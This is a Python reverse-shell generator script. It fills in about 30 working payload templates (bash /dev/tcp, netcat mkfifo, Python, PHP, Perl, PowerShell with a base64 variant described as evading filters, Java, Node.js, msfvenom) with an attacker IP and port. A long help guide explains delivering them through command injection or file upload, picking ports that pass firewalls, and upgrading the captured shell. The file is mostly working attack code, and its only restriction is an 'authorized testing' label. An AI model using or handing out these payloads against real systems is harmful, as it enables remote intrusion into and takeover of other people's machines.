#!/usr/bin/env python3
"""
Reverse Shell Generator
Generates reverse shell payloads for various languages
For authorized security testing only

QUICK START:
    ./reverse_shells.py -i 192.168.1.10 -p 4444
    ./reverse_shells.py -i 10.10.14.5 -p 9001 -t python
    ./reverse_shells.py -i attacker.com -p 443 --list
"""

import argparse
import sys
import base64
import urllib.parse
from typing import Dict, List

# Colors
class C:
    R = '\033[91m'
    Y = '\033[93m'
    G = '\033[92m'
    B = '\033[94m'
    M = '\033[95m'
    C = '\033[96m'
    E = '\033[0m'

# Reverse shell templates
SHELLS = {
    'bash': {
        'name': 'Bash TCP',
        'description': 'Standard bash reverse shell using /dev/tcp',
        'payload': 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        'oneliner': True,
    },
    'bash_udp': {
        'name': 'Bash UDP',
        'description': 'Bash reverse shell over UDP',
        'payload': 'bash -i >& /dev/udp/{ip}/{port} 0>&1',
        'oneliner': True,
    },
    'bash_196': {
        'name': 'Bash 196',
        'description': 'Bash reverse shell using file descriptor 196',
        'payload': '0<&196;exec 196<>/dev/tcp/{ip}/{port}; bash <&196 >&196 2>&196',
        'oneliner': True,
    },
    'bash_readline': {
        'name': 'Bash Readline',
        'description': 'Bash reverse shell with readline support',
        'payload': 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
        'oneliner': True,
    },
    'nc': {
        'name': 'Netcat Traditional',
        'description': 'Classic netcat with -e flag (older versions)',
        'payload': 'nc -e /bin/bash {ip} {port}',
        'oneliner': True,
    },
    'nc_mkfifo': {
        'name': 'Netcat FIFO',
        'description': 'Netcat using mkfifo (works without -e)',
        'payload': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f',
        'oneliner': True,
    },
    'nc_c': {
        'name': 'Netcat -c',
        'description': 'Netcat with -c flag',
        'payload': 'nc -c bash {ip} {port}',
        'oneliner': True,
    },
    'ncat': {
        'name': 'Ncat',
        'description': 'Nmap ncat reverse shell',
        'payload': 'ncat {ip} {port} -e /bin/bash',
        'oneliner': True,
    },
    'ncat_ssl': {
        'name': 'Ncat SSL',
        'description': 'Ncat reverse shell over SSL (encrypted)',
        'payload': 'ncat --ssl {ip} {port} -e /bin/bash',
        'oneliner': True,
    },
    'python': {
        'name': 'Python',
        'description': 'Python reverse shell (2.x and 3.x compatible)',
        'payload': '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' ''',
        'oneliner': True,
    },
    'python3': {
        'name': 'Python3',
        'description': 'Python3 reverse shell',
        'payload': '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);' ''',
        'oneliner': True,
    },
    'python_short': {
        'name': 'Python Short',
        'description': 'Shorter Python reverse shell',
        'payload': '''python -c 'import os;import pty;import socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")' ''',
        'oneliner': True,
    },
    'php': {
        'name': 'PHP',
        'description': 'PHP reverse shell using exec',
        'payload': '''php -r '$sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");' ''',
        'oneliner': True,
    },
    'php_system': {
        'name': 'PHP System',
        'description': 'PHP reverse shell using system()',
        'payload': '''php -r '$sock=fsockopen("{ip}",{port});shell_exec("/bin/bash -i <&3 >&3 2>&3");' ''',
        'oneliner': True,
    },
    'php_full': {
        'name': 'PHP Full',
        'description': 'Full PHP reverse shell (file)',
        'payload': '''<?php $sock=fsockopen("{ip}",{port});$proc=proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>''',
        'oneliner': False,
    },
    'perl': {
        'name': 'Perl',
        'description': 'Perl reverse shell',
        'payload': '''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}};' ''',
        'oneliner': True,
    },
    'perl_nosh': {
        'name': 'Perl No /bin/sh',
        'description': 'Perl reverse shell without shell dependency',
        'payload': '''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' ''',
        'oneliner': True,
    },
    'ruby': {
        'name': 'Ruby',
        'description': 'Ruby reverse shell',
        'payload': '''ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)' ''',
        'oneliner': True,
    },
    'ruby_nosh': {
        'name': 'Ruby No /bin/sh',
        'description': 'Ruby reverse shell without shell',
        'payload': '''ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end' ''',
        'oneliner': True,
    },
    'socat': {
        'name': 'Socat',
        'description': 'Socat reverse shell',
        'payload': 'socat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:{ip}:{port}',
        'oneliner': True,
    },
    'socat_tty': {
        'name': 'Socat TTY',
        'description': 'Socat with full TTY',
        'payload': 'socat tcp-connect:{ip}:{port} exec:/bin/bash,pty,stderr,setsid,sigint,sane',
        'oneliner': True,
    },
    'powershell': {
        'name': 'PowerShell',
        'description': 'PowerShell reverse shell (Windows)',
        'payload': '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',
        'oneliner': True,
    },
    'powershell_b64': {
        'name': 'PowerShell Base64',
        'description': 'PowerShell base64 encoded (evades some filters)',
        'payload': 'powershell_b64',  # Special handling
        'oneliner': True,
    },
    'java': {
        'name': 'Java',
        'description': 'Java reverse shell (Runtime.exec)',
        'payload': '''r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]);p.waitFor();''',
        'oneliner': False,
    },
    'java_alt': {
        'name': 'Java Alternative',
        'description': 'Java reverse shell alternative',
        'payload': '''String host="{ip}";int port={port};String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();''',
        'oneliner': False,
    },
    'nodejs': {
        'name': 'Node.js',
        'description': 'Node.js reverse shell',
        'payload': '''(function(){{var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/bash", []);var client = new net.Socket();client.connect({port}, "{ip}", function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();''',
        'oneliner': True,
    },
    'groovy': {
        'name': 'Groovy',
        'description': 'Groovy reverse shell (Jenkins)',
        'payload': '''String host="{ip}";int port={port};String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{{p.exitValue();break;}}catch(Exception e){{}}}};p.destroy();s.close();''',
        'oneliner': True,
    },
    'awk': {
        'name': 'AWK',
        'description': 'AWK reverse shell',
        'payload': '''awk 'BEGIN {{s = "/inet/tcp/0/{ip}/{port}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}' /dev/null''',
        'oneliner': True,
    },
    'lua': {
        'name': 'Lua',
        'description': 'Lua reverse shell',
        'payload': '''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/bash -i <&3 >&3 2>&3');"''',
        'oneliner': True,
    },
    'xterm': {
        'name': 'Xterm',
        'description': 'Xterm reverse shell (requires X)',
        'payload': 'xterm -display {ip}:1',
        'oneliner': True,
        'note': 'Run: Xnest :1 or xhost +targetip on attacker',
    },
    'msfvenom_linux': {
        'name': 'Msfvenom Linux',
        'description': 'Msfvenom command for Linux payload',
        'payload': 'msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf',
        'oneliner': True,
        'note': 'Generates ELF binary. chmod +x and execute.',
    },
    'msfvenom_windows': {
        'name': 'Msfvenom Windows',
        'description': 'Msfvenom command for Windows payload',
        'payload': 'msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe',
        'oneliner': True,
        'note': 'Generates Windows executable.',
    },
}

LISTENERS = {
    'nc': 'nc -lvnp {port}',
    'ncat': 'ncat -lvnp {port}',
    'ncat_ssl': 'ncat --ssl -lvnp {port}',
    'socat': 'socat file:`tty`,raw,echo=0 tcp-listen:{port}',
    'rlwrap': 'rlwrap nc -lvnp {port}',
    'pwncat': 'pwncat -l {port}',
    'metasploit': '''msfconsole -q -x "use exploit/multi/handler; set payload {payload}; set LHOST {ip}; set LPORT {port}; run"''',
}

HELP_TEXT = """
================================================================================
                   REVERSE SHELL GENERATOR - COMPLETE GUIDE
================================================================================

WHAT IS A REVERSE SHELL?
------------------------
A reverse shell is when the TARGET machine initiates a connection back to
YOUR machine. This gives you command-line access to the target.

NORMAL (BIND) SHELL:        REVERSE SHELL:
  You → connect to → Target    Target → connects to → You

WHY REVERSE SHELLS MATTER:
  • Firewalls usually block INBOUND connections (bind shell fails)
  • Firewalls usually allow OUTBOUND connections (reverse shell works!)
  • NAT makes it hard to reach the target, but target can reach you
  • This is how you get shell access after exploiting a vulnerability

THE REVERSE SHELL WORKFLOW
--------------------------

STEP 1: SET UP YOUR LISTENER (on YOUR machine)
  Before the target runs anything, you need to be listening!

  nc -lvnp 4444

  -l = listen mode
  -v = verbose (shows connection info)
  -n = no DNS lookup (faster)
  -p = port to listen on

STEP 2: TARGET RUNS THE PAYLOAD
  Through an exploit, command injection, file upload, etc.,
  the target executes your reverse shell payload.

STEP 3: YOU GET A SHELL!
  Target connects to your listener.
  You now have command-line access to the target.

CHOOSING THE RIGHT SHELL TYPE
-----------------------------
Different targets have different tools installed. Pick the right payload:

BASH (Linux - Most Common)
  WHEN TO USE: Target is Linux and you have command execution
  REQUIREMENTS: Bash (almost always present on Linux)
  RELIABILITY: Very high
  WHY IT WORKS: Bash's /dev/tcp is a special file that creates connections

NETCAT (Linux/Windows)
  WHEN TO USE: When nc (netcat) is installed
  NOTE: Some nc versions lack the -e flag (use mkfifo version instead)
  RELIABILITY: High when nc is available

PYTHON (Linux - Very Reliable)
  WHEN TO USE: Python is almost ALWAYS installed on Linux
  RELIABILITY: Very high
  WHY IT'S GOOD: Python is everywhere, payload is self-contained

PHP (Web Servers)
  WHEN TO USE: You can execute PHP (webshell, command injection)
  REQUIREMENTS: PHP installed (web servers usually have it)

POWERSHELL (Windows)
  WHEN TO USE: Target is Windows
  REQUIREMENTS: PowerShell (default on modern Windows)
  WHY POWERSHELL: Most powerful shell on Windows

SOCAT (Best Quality Shell)
  WHEN TO USE: When socat is installed (or you can upload it)
  ADVANTAGE: Provides FULL TTY - arrow keys, tab completion work!

PORT SELECTION STRATEGY
-----------------------
Not all ports work in all environments. Firewalls filter traffic!

PORT 4444 - Classic default
  • Easy to remember, but security tools flag this port
  • Use for CTFs, labs, unmonitored networks

PORT 443 - HTTPS
  • Almost ALWAYS allowed outbound (looks like web traffic)
  • Best choice for restrictive environments

PORT 80 - HTTP
  • Also usually allowed, good fallback

PORT 53 - DNS
  • Often allowed through firewalls

TIP: If shell doesn't connect, try different ports!

UPGRADING YOUR SHELL (CRITICAL!)
--------------------------------
Raw reverse shells are limited - no arrow keys, no tab completion,
Ctrl+C kills your shell. ALWAYS upgrade!

METHOD 1: PYTHON PTY (Most Common)
  python -c 'import pty; pty.spawn("/bin/bash")'

METHOD 2: FULL TTY UPGRADE
  # After Python PTY:
  Ctrl+Z                    # Background the shell
  stty raw -echo; fg        # On YOUR machine
  export TERM=xterm         # Back in the shell

  Now you have: arrow keys, tab completion, Ctrl+C works!

SCENARIO-BASED USAGE
--------------------

SCENARIO: "I have command injection on a Linux server"
COMMAND:  ./reverse_shells.py -i 10.10.14.5 -p 4444 -t bash
WHY:      Bash is the most reliable for Linux.
SETUP:    Run `nc -lvnp 4444` on your machine first!

SCENARIO: "Target is Windows"
COMMAND:  ./reverse_shells.py -i 10.10.14.5 -p 443 -t powershell
WHY:      PowerShell is powerful and always present on Windows.
          Port 443 is likely allowed through firewall.

SCENARIO: "I can upload files to a PHP web server"
COMMAND:  ./reverse_shells.py -i 10.10.14.5 -p 4444 -t php
WHY:      Save output as .php file, browse to it to trigger.

SCENARIO: "Not sure what's installed on target"
COMMAND:  ./reverse_shells.py -i 10.10.14.5 -p 4444 --all
WHY:      Generates ALL shell types. Try them one by one.

SCENARIO: "Special chars are filtered"
COMMAND:  ./reverse_shells.py -i 10.10.14.5 -p 4444 -t bash --encode base64
WHY:      Base64 encoding avoids special character issues.

TROUBLESHOOTING
---------------

SHELL WON'T CONNECT?
  1. Is your listener running BEFORE the payload executes?
  2. Is your IP correct? (use `ip a` to check)
  3. Try different port (443 or 80)
  4. Is the payload correct for the target OS?

SHELL CONNECTS THEN DIES?
  1. Upgrade to PTY immediately
  2. Don't use Ctrl+C before upgrading
  3. Try socat for more stable connection

COMMON MISTAKES TO AVOID
------------------------
❌ Forgetting to start listener before running payload
❌ Using wrong IP (internal vs external)
❌ Not trying different ports when 4444 doesn't work
❌ Using Ctrl+C before upgrading shell
❌ Not upgrading to full TTY

QUICK REFERENCE
---------------
./reverse_shells.py -i IP -p PORT                 # Default shell
./reverse_shells.py -i IP -p PORT -t bash         # Bash shell
./reverse_shells.py -i IP -p PORT -t python       # Python shell
./reverse_shells.py -i IP -p PORT -t powershell   # Windows shell
./reverse_shells.py -i IP -p PORT --all           # All shells
./reverse_shells.py --list                        # List all types

================================================================================
"""

def banner():
    print(f"""{C.R}
    ____                                    _____ __         ____
   / __ \\___ _   _____  _____________     / ___// /_  ___  / / /____
  / /_/ / _ \\ | / / _ \\/ ___/ ___/ _ \\    \\__ \\/ __ \\/ _ \\/ / / ___/
 / _, _/  __/ |/ /  __/ /  (__  )  __/   ___/ / / / /  __/ / (__  )
/_/ |_|\\___/|___/\\___/_/  /____/\\___/   /____/_/ /_/\\___/_/_/____/
{C.E}{C.Y}Reverse Shell Payload Generator{C.E}
""")

def generate_shell(shell_type: str, ip: str, port: int) -> Dict:
    """Generate a reverse shell payload"""
    if shell_type not in SHELLS:
        return None

    shell = SHELLS[shell_type].copy()

    # Special handling for PowerShell base64
    if shell_type == 'powershell_b64':
        ps_payload = SHELLS['powershell']['payload'].format(ip=ip, port=port)
        encoded = base64.b64encode(ps_payload.encode('utf-16le')).decode()
        shell['payload'] = f'powershell -e {encoded}'
    else:
        shell['payload'] = shell['payload'].format(ip=ip, port=port)

    return shell

def encode_payload(payload: str, encoding: str) -> str:
    """Encode payload"""
    if encoding == 'base64':
        return base64.b64encode(payload.encode()).decode()
    elif encoding == 'url':
        return urllib.parse.quote(payload)
    return payload

def list_shells():
    """List all available shells"""
    print(f"\n{C.B}Available Reverse Shell Types:{C.E}\n")

    categories = {
        'Linux/Unix': ['bash', 'bash_udp', 'nc', 'nc_mkfifo', 'python', 'python3',
                       'php', 'perl', 'ruby', 'socat', 'awk', 'lua'],
        'Windows': ['powershell', 'powershell_b64'],
        'Web/Scripting': ['php', 'php_full', 'nodejs', 'java', 'groovy'],
        'Msfvenom': ['msfvenom_linux', 'msfvenom_windows'],
    }

    for category, shell_types in categories.items():
        print(f"  {C.M}{category}:{C.E}")
        for st in shell_types:
            if st in SHELLS:
                shell = SHELLS[st]
                print(f"    {C.C}{st:18}{C.E} - {shell['description']}")
        print()

def main():
    parser = argparse.ArgumentParser(description='Reverse Shell Generator')
    parser.add_argument('-i', '--ip', help='Your IP address (attacker)')
    parser.add_argument('-p', '--port', type=int, help='Your listening port')
    parser.add_argument('-t', '--type', default='bash', help='Shell type')
    parser.add_argument('--list', action='store_true', help='List all shell types')
    parser.add_argument('--listener', action='store_true', help='Show listener command')
    parser.add_argument('--all', action='store_true', help='Generate all shells')
    parser.add_argument('--encode', choices=['base64', 'url'], help='Encode payload')
    parser.add_argument('-o', '--output', help='Save to file')
    parser.add_argument('--help-full', action='store_true', help='Show detailed help')

    args = parser.parse_args()

    if args.help_full:
        print(HELP_TEXT)
        return

    banner()

    if args.list:
        list_shells()
        return

    if not args.ip or not args.port:
        parser.print_help()
        print(f"\n{C.Y}Tip:{C.E} Use --help-full for detailed guide")
        print(f"{C.Y}Tip:{C.E} Use --list to see all shell types")
        return

    print(f"{C.B}[*]{C.E} Attacker IP: {args.ip}")
    print(f"{C.B}[*]{C.E} Attacker Port: {args.port}")
    print()

    # Show listener
    if args.listener:
        print(f"{C.M}[LISTENER] Start this on your machine first:{C.E}")
        print(f"  {C.G}nc -lvnp {args.port}{C.E}")
        print(f"  {C.G}rlwrap nc -lvnp {args.port}{C.E}  (better arrow key support)")
        print(f"  {C.G}socat file:`tty`,raw,echo=0 tcp-listen:{args.port}{C.E}  (full TTY)")
        print()

    # Generate shells
    if args.all:
        output_lines = []
        for shell_type in SHELLS:
            shell = generate_shell(shell_type, args.ip, args.port)
            if shell:
                print(f"{C.M}[{shell['name']}]{C.E}")
                payload = shell['payload']
                if args.encode:
                    payload = encode_payload(payload, args.encode)
                print(f"  {C.C}{payload}{C.E}")
                if shell.get('note'):
                    print(f"  {C.Y}Note: {shell['note']}{C.E}")
                print()
                output_lines.append(f"# {shell['name']}\n{payload}\n")
    else:
        shell = generate_shell(args.type, args.ip, args.port)

        if not shell:
            print(f"{C.R}[!]{C.E} Unknown shell type: {args.type}")
            print(f"{C.Y}Use --list to see available types{C.E}")
            return

        print(f"{C.M}[{shell['name']}]{C.E}")
        print(f"{C.B}Description:{C.E} {shell['description']}")
        print()

        payload = shell['payload']
        if args.encode:
            payload = encode_payload(payload, args.encode)
            print(f"{C.B}Encoded ({args.encode}):{C.E}")

        print(f"{C.G}{payload}{C.E}")

        if shell.get('note'):
            print(f"\n{C.Y}Note: {shell['note']}{C.E}")

        output_lines = [payload]

    # Save output
    if args.output:
        with open(args.output, 'w') as f:
            if args.all:
                for shell_type in SHELLS:
                    shell = generate_shell(shell_type, args.ip, args.port)
                    if shell:
                        f.write(f"# {shell['name']}\n{shell['payload']}\n\n")
            else:
                shell = generate_shell(args.type, args.ip, args.port)
                if shell:
                    f.write(shell['payload'])
        print(f"\n{C.B}[*]{C.E} Saved to {args.output}")

    # Shell upgrade tip
    print(f"\n{C.Y}[TIP] Upgrade to full TTY after catching shell:{C.E}")
    print(f"  python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
    print(f"  Ctrl+Z")
    print(f"  stty raw -echo; fg")
    print(f"  export TERM=xterm")

if __name__ == '__main__':
    main()
